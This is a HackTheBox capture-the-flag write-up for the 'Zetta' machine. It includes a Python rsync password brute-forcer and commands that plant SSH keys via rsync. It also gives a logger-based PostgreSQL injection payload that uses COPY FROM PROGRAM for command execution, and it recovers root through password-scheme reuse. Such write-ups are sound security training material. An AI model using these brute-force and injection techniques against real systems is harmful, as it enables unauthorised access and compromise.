# Zetta - HackTheBox
## Linux - Hard

## User
Connect to `ftp`. From webpage, we know it accept RFC2428. Looking up the RFC, we see we can change IP address or something like that. We want to get the IPv6 address of the box to enumerate further. We connect to `ftp` with netcat. We send the command `EPRT |2|dead:beef:2::12ad|5282|` after authenticating to switch to IPv6. We look at Wireshark while doing so and we get a response from the IPv6 address of the box.

Do Nmap for IPv6 and find that port 8730 open. It is rsync. Try different modules, `etc` is open. Download it using 
```bash
rsync -rltvvv --port=8730 'roy@[dead:beef::250:56ff:feb9:d95a]::etc' etc
```
Look at `rsyncd.conf` in `etc`, we find that a module `home_roy` is open. It requires a password. Use the following python script to bruteforce password:
```python
import socket
import time
import hashlib
import base64
import sys

def generate_challenge(data):
    """generate challenge string from rsync response"""

    # Line 59, From rsync/authenticate.c, original:
    # void gen_challenge(const char *addr, char *challenge)

    # '@RSYNCD: 31.0\n@RSYNCD: AUTHREQD qUah8Knxn+k1k9LINf4fkg\n'

    if "AUTHREQD" not in data:
        raise Exception("fails to recv rsync challenge response")

    challenge = data.split("AUTHREQD ")[1]
    challenge = challenge.strip()

    return challenge

def generate_hash(password, challenge):
    """generate rsync password hash"""

    # Line 83, From rsync/authenticate.c, original:
    # void generate_hash(const char *in, const char *challenge, char *out)

    md5 = hashlib.md5()
    md5.update(password)
    md5.update(challenge)
    md5.digest()

    pwdhash = base64.b64encode(md5.digest())  # 'NCjPJpWP7VPP2dO7X0jhrw=='
    pwdhash = pwdhash.rstrip('==')

    return pwdhash

def main():
    passes = open('/usr/share/wordlists/pass10000.txt').read().split('\n')[:-1]
    print len(passes)
    for p in passes:
        print p
        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
        sock.connect(("dead:beef::250:56ff:feb9:14b6", 8730,0,0))
        sock.send("@RSYNCD: 31.0\n")
        sock.send("home_roy\n")
        data = ""
        while "AUTHREQD" not in data:
            data = sock.recv(4096)
        chal = generate_challenge(data)
        print chal
        resp = generate_hash(p, chal)
        sock.send("roy {}\n".format(resp))
        fin = ""
        while not fin:
            fin = sock.recv(4096)
        print fin
        if "OK" in fin:
            return
        del sock


if __name__ == '__main__':
    main()
```
After 20 seconds, it outputs:
```
---------- snip -----------
computer
Smli2oF8W9cF9uyCnh47hg
@RSYNCD: OK
```
so the password is `computer`.

We download `home_roy` with the command
``` bash
rsync -rltvvv --port=8730 'roy@[dead:beef::250:56ff:feb9:d95a]::home_roy' home_roy
```
We find a `.ssh` folder. I add my public key to `authorized_keys` and upload it using
```bash
rsync -razhv --port=8730 home_roy/.ssh/authorized_keys  'roy@[dead:beef::250:56ff:feb9:d95a]::home_roy/.ssh/authorized_keys'
```
Then `ssh -i key roy@zetta.htb` gives a shell as roy on the box and we get `user.txt`.

## Root

We find the folder `/etc/rsyslog.d/` which is a git repo. Downloading the repo, we get the file `pgsql.conf` which shows rules for logging. There is an SQLi there. It is tricky to escape the quotes. After some research, we find that in Postgresql, we can put strings between `$$` and there is no need to escape quote. With that, the SQLi is easy to exploit for command injection. We copy our public key to the `.ssh` folder of the `postgres` user. Here is the command to exploit it:
```bash
logger -p local7.info 'bam'"'"',NULL);DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM $$ mkdir /var/lib/postgresql/.ssh; echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqzkryHZ/K5IJAbh2Be9e0Qjp9EA2eczOs9oUyRVljYm0i8fJiwsXCcWOuTEzmdsk+vRUteFLfrcFh5R/HiqCjv3t3wzUsaHaNHwLJrwp2ovnLNPUKcIBme/ucnZBl3XeLqA3C+cl6vWA1tEYiNkbxkhllrfC6PhCOjuGM2O4aZOXigsOtAKq30sW+pTfAv0zXpPrxM6tVh469IWjetY/ywL9/ve3+qkKWVEv+1PInGYEThLTHa5eohUGHmhIMOpS/lDyDQ8inTxQVFdsIuSj0i4zf/ho/34a7wF3x4v/YK84QQLJnU1i1/6VwS6bWrmrqWDjzN+811lWYYEanom9v root@kali' > /var/lib/postgresql/.ssh/authorized_keys; $$ ;SELECT * FROM cmd_exec;DROP TABLE IF EXISTS cmd_exec;-- -   '
```
Then with `ssh -i key postgres@zetta.htb`, we get a shell as `postgres`.

We see a file `.psql_history` in `/var/lib/postgres`. In it there is a password `sup3rs3cur3p4ass@postgres`. We now remember the `.tudu.xml` in `/home/roy` where it was written:
```xml
<todo done="no" collapse="no">
	<title>Change shared password scheme from &lt;secret&gt;@userid to something more secure.</title>
</todo>
```
We see that this password satisfies this scheme. Let's try `sup3rs3cur3p4ass@root` for the root password... And we are in!
